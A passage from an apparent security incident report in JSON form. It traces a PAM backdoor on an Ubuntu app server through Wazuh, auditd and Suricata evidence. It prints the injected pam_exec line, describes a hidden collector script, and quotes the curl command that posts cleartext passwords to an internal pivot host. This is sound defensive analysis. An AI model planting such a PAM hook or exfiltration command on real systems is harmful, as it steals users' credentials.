    {"host": "ubuntu-app-srv-07", "ip": "10.108.57.102", "role": "linux_app_server_pam_modified", "first_seen": "2027-08-04T22:31:14+0200", "last_seen": "2027-08-04T22:42:48+0200"},
    {"ip": "10.108.57.184", "inferred_role": "internal_attacker_pivot_host", "first_seen": "2027-08-04T22:41:09+0200", "last_seen": "2027-08-04T22:42:48+0200"}
  ],
  "attack_progression": [
    {"step": 1, "tactic": "Persistence / Modify Authentication Process — PAM module injection", "technique": "T1556.003", "what_happened": "At 2027-08-04 22:31:14 CEST, Wazuh FIM (syscheck) on ubuntu-app-srv-07 (agent.id=107) reported syscheck.event='modified' on syscheck.path=/etc/pam.d/sshd. The diff appended a new line at the TOP of the file: 'auth optional pam_exec.so expose_authtok /usr/local/bin/.cred_collector_20270804_223114.sh'. The line was injected BEFORE the @include common-auth directive so pam_exec runs FIRST on every SSH auth attempt — capturing PAM_USER + PAM_AUTHTOK plaintext before the legitimate stack processes them. The expose_authtok option specifically passes the cleartext password via stdin to the called script. This is the textbook T1556.003 PAM persistence pattern; PDF artefact C 'PAM Modification (Linux): File=/etc/pam.d/sshd AddedRule=pam_exec.so' is literally present.", "chain_reason": "Wazuh FIM rule 550 + custom rule 80791 'auditd: write access to /etc/pam.d' fired with rule.mitre.id=T1556.003. The auditd watch '-w /etc/pam.d/ -p wa' is configured fleet-wide as a Tier-0 watch — every write to /etc/pam.d/ generates an immediate alert.", "first_seen": "2027-08-04T22:31:14+0200"},
    {"step": 2, "tactic": "Persistence / Collector Drop in /usr/local/bin", "technique": "T1556.003", "what_happened": "At 22:31:09 CEST (5s BEFORE the PAM modification — the attacker dropped the collector first to ensure it existed when pam_exec was invoked), Wazuh FIM reported syscheck.event='added' on syscheck.path=/usr/local/bin/.cred_collector_20270804_223114.sh, syscheck.uname_after='root', mode='755' (executable). The DOT-PREFIX (leading '.') makes the file hidden from default ls listings. The file is NOT dpkg-owned, not in the corp config-management inventory. Content (captured by syscheck.diff): a 5-line shell script that reads PAM_USER + PAM_AUTHTOK from environment, formats them as 'u=<user> p=<pass>', and POSTs to http://10.108.57.184/c via curl with --max-time 3. This is the credential exfiltration mechanism — pam_exec invokes it on every auth.", "chain_reason": "Wazuh FIM rule 550 + custom rule 80710 'Suspicious file created in /usr/local/bin' fired with rule.mitre.id=T1556.003 because the new file (a) has a hidden dot-prefix name, (b) is in /usr/local/bin which the corp config-management does not write to outside change windows, (c) is shell-executable, (d) is not dpkg-owned.", "first_seen": "2027-08-04T22:31:09+0200"},
    {"step": 3, "tactic": "Execution / Auditd captures WHO wrote /etc/pam.d/sshd", "technique": "T1556.003", "what_happened": "Linux auditd captured the EXECVE chain that performed the PAM injection at 22:31:13 CEST (1s before the FIM-visible result): data.audit.exe=/usr/bin/cp, data.audit.command='cp /tmp/pam_sshd_new_20270804_223114 /etc/pam.d/sshd', data.audit.uid=0 (root), data.audit.euid=0, data.audit.ppid=18742 (the parent shell). The parent shell session traces back to an interactive SSH login as 'svc_deploy' (uid=1004) at 22:28:42, which then escalated to root via 'sudo -i' at 22:30:55 — meaning the attacker compromised the svc_deploy account first and used its sudo privilege to plant the PAM backdoor.", "chain_reason": "Wazuh custom rule 80792 'auditd: cp/mv/dd targeting /etc/pam.d/ from interactive shell' fired with rule.mitre.id=T1556.003 because the EXECVE chain shows a copy operation INTO /etc/pam.d/ from a non-package-manager parent (the parent is bash via sudo, not apt/dpkg). The sudo chain is the credential-pivot fingerprint — attacker compromised svc_deploy first, then escalated via its sudo rights.", "first_seen": "2027-08-04T22:31:13+0200"},
    {"step": 4, "tactic": "Credential Access / Live Exfiltration via pam_exec", "technique": "T1056.001", "what_happened": "At 22:41:09 CEST (~10 minutes after the backdoor was installed), a successful SSH login to ubuntu-app-srv-07 as user 'admin_smith' (uid=1012) triggered the pam_exec line. Linux auditd captured: data.audit.exe=/usr/bin/curl, data.audit.command='curl -s --max-time 3 --data-binary @- http://10.108.57.184/c', data.audit.uid=0 (the script runs as root because pam_exec runs in sshd's context), data.audit.ppid traces to the /usr/local/bin/.cred_collector_20270804_223114.sh process spawned by pam_exec. Suricata also logged the outbound flow: data.srcip=10.108.57.102, data.dstip=10.108.57.184, data.dstport=80, data.alert.signature='ET POLICY HTTP POST with credential-like body to internal host'. This is LIVE CREDENTIAL EXFILTRATION — admin_smith's cleartext password just left the host bound for the attacker's internal pivot.", "chain_reason": "Wazuh custom rule 80793 'Credential exfiltration via pam_exec collector' fired with rule.mitre.id=[T1556.003,T1056.001] correlating: (a) the collector path matching step-2 FIM evidence as parent of the curl, (b) the auditd context showing root uid running curl from sshd PAM stack, (c) the Suricata flow with destination matching the attacker IP literally in the collector script content.", "first_seen": "2027-08-04T22:41:09+0200"}
  ],
